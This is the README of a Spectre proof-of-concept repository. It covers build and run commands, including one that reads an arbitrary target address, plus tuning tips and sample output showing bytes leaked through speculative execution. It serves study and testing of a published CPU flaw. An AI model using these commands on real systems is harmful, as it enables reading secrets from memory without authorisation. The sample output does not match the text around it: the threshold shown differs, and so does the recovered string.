# SpectrePoC

Proof of concept code for the Spectre CPU exploit.

## Attribution

The source code originates from the example code provided in the "Spectre Attacks: Exploiting Speculative Execution" paper found here:

https://spectreattack.com/spectre.pdf

The original source code used in this repository was conveniently provided by Erik August's gist, found here: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6

The code has been modified to fix build issues, add workaround for older CPUs, and improve comments where possible.

## Building

The project can be built with GNU Make and GCC.

On debian these are included in the `build-essential` metapackage.

Building is as easy as:

`cd SpectrePoC`

`make`

The output binary is `./spectre.out`.

### Building for older CPUs

If the target CPU doesn't support the "rdtscp" instruction, then the macro "NORDTSCP" must be defined.

Build the project with the NORDTSCP cflag:

`CFLAGS=-DNORDTSCP make`

If the target CPU doesn't support the "clflush" instruction, then the macro "NOCLFLUSH" must be defined.

Build the project with the NOCLFLUSH cflag:

`CFLAGS=-DNOCLFLUSH make`

### Building it without using the Makefile

If you want to build it manually, make sure to disable all optimisations (aka, don't use -O2), as it will break the program.

## Executing

To run specter with default cache hit threshold of 80, and the secret example string "The Magic Words are Squeamish Ossifrage." as the target, run `./spectre.out` with no command line arguments.

**Example:** `./spectre.out`

The cache hit threshold can be specified as the first command line argument. It must be a whole positive integer.

**Example:** `./spectre.out 80`

A custom target address and length can be given as the second and third command line arguments, respectively.

**Example:** `./spectre.out 80 12345678 128`

## Tweaking

If you're getting lackluster results, you may need to tweak the cache hit threshold. This can be done by providing a threshold as the first command line argument.

While a value of 80 appears to work for most desktop CPUs, a larger value may be required for slower CPUs. For example, on a AMD GX-412TC SOC, a value of 100-300 was required to get a good result.

## Contributing

Feel free to add your results to the "Results" issue. Include your cache hit threshold, OS details, CPU details like vendor Id, family, model name, stepping, microcode, Mhz, and cache size. These can be found by running `uname -a` and `cat /proc/cpuinfo`.

## Example output

The following was output on an AMD GX-412TC SOC, with a cache hit threshold of 100:

`./spectre.out 100:`

```
Using a cache hit threshold of 80.
Build: RDTSCP_SUPPORTED CLFLUSH_SUPPORTED 
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffdfeda8... Success: 0x54=’T’ score=2 
Reading at malicious_x = 0xffffffffffdfeda9... Success: 0x68=’h’ score=2 
Reading at malicious_x = 0xffffffffffdfedaa... Success: 0x65=’e’ score=2 
Reading at malicious_x = 0xffffffffffdfedab... Success: 0x20=’ ’ score=15 (second best: 0x05=’?’ score=5)
Reading at malicious_x = 0xffffffffffdfedac... Success: 0x4D=’M’ score=183 (second best: 0x05=’?’ score=89)
Reading at malicious_x = 0xffffffffffdfedad... Unclear: 0x61=’a’ score=985 (second best: 0x01=’?’ score=747)
Reading at malicious_x = 0xffffffffffdfedae... Unclear: 0x67=’g’ score=998 (second best: 0x01=’?’ score=762)
Reading at malicious_x = 0xffffffffffdfedaf... Unclear: 0x69=’i’ score=984 (second best: 0x01=’?’ score=774)
Reading at malicious_x = 0xffffffffffdfedb0... Unclear: 0x63=’c’ score=970 (second best: 0x01=’?’ score=725)
Reading at malicious_x = 0xffffffffffdfedb1... Unclear: 0x20=’ ’ score=988 (second best: 0x01=’?’ score=734)
Reading at malicious_x = 0xffffffffffdfedb2... Unclear: 0x48=’H’ score=998 (second best: 0x01=’?’ score=741)
Reading at malicious_x = 0xffffffffffdfedb3... Unclear: 0x61=’a’ score=952 (second best: 0x01=’?’ score=708)
Reading at malicious_x = 0xffffffffffdfedb4... Unclear: 0x70=’p’ score=957 (second best: 0x01=’?’ score=710)
Reading at malicious_x = 0xffffffffffdfedb5... Unclear: 0x70=’p’ score=979 (second best: 0x01=’?’ score=722)
Reading at malicious_x = 0xffffffffffdfedb6... Unclear: 0x65=’e’ score=976 (second best: 0x01=’?’ score=780)
Reading at malicious_x = 0xffffffffffdfedb7... Unclear: 0x6E=’n’ score=980 (second best: 0x01=’?’ score=735)
Reading at malicious_x = 0xffffffffffdfedb8... Unclear: 0x73=’s’ score=993 (second best: 0x01=’?’ score=755)
Reading at malicious_x = 0xffffffffffdfedb9... Unclear: 0x20=’ ’ score=986 (second best: 0x01=’?’ score=759)
Reading at malicious_x = 0xffffffffffdfedba... Unclear: 0x57=’W’ score=976 (second best: 0x01=’?’ score=771)
Reading at malicious_x = 0xffffffffffdfedbb... Unclear: 0x69=’i’ score=992 (second best: 0x01=’?’ score=721)
Reading at malicious_x = 0xffffffffffdfedbc... Unclear: 0x74=’t’ score=996 (second best: 0x01=’?’ score=766)
Reading at malicious_x = 0xffffffffffdfedbd... Unclear: 0x68=’h’ score=997 (second best: 0x01=’?’ score=751)
Reading at malicious_x = 0xffffffffffdfedbe... Unclear: 0x20=’ ’ score=986 (second best: 0x01=’?’ score=774)
Reading at malicious_x = 0xffffffffffdfedbf... Unclear: 0x53=’S’ score=988 (second best: 0x01=’?’ score=661)
Reading at malicious_x = 0xffffffffffdfedc0... Unclear: 0x68=’h’ score=996 (second best: 0x01=’?’ score=781)
Reading at malicious_x = 0xffffffffffdfedc1... Unclear: 0x65=’e’ score=974 (second best: 0x01=’?’ score=728)
Reading at malicious_x = 0xffffffffffdfedc2... Unclear: 0x6C=’l’ score=982 (second best: 0x01=’?’ score=694)
Reading at malicious_x = 0xffffffffffdfedc3... Unclear: 0x6C=’l’ score=983 (second best: 0x01=’?’ score=712)
Reading at malicious_x = 0xffffffffffdfedc4... Unclear: 0x63=’c’ score=977 (second best: 0x01=’?’ score=719)
Reading at malicious_x = 0xffffffffffdfedc5... Unclear: 0x6F=’o’ score=989 (second best: 0x01=’?’ score=759)
Reading at malicious_x = 0xffffffffffdfedc6... Unclear: 0x64=’d’ score=985 (second best: 0x01=’?’ score=790)
Reading at malicious_x = 0xffffffffffdfedc7... Unclear: 0x65=’e’ score=961 (second best: 0x01=’?’ score=774)
Reading at malicious_x = 0xffffffffffdfedc8... Unclear: 0x20=’ ’ score=988 (second best: 0x01=’?’ score=749)
Reading at malicious_x = 0xffffffffffdfedc9... Unclear: 0x54=’T’ score=997 (second best: 0x01=’?’ score=731)
Reading at malicious_x = 0xffffffffffdfedca... Unclear: 0x68=’h’ score=999 (second best: 0x01=’?’ score=777)
Reading at malicious_x = 0xffffffffffdfedcb... Unclear: 0x65=’e’ score=994 (second best: 0x01=’?’ score=802)
Reading at malicious_x = 0xffffffffffdfedcc... Unclear: 0x20=’ ’ score=996 (second best: 0x01=’?’ score=758)
Reading at malicious_x = 0xffffffffffdfedcd... Unclear: 0x48=’H’ score=994 (second best: 0x01=’?’ score=735)
Reading at malicious_x = 0xffffffffffdfedce... Unclear: 0x34=’4’ score=990 (second best: 0x01=’?’ score=762)
Reading at malicious_x = 0xffffffffffdfedcf... Success: 0x63=’c’ score=2 
```
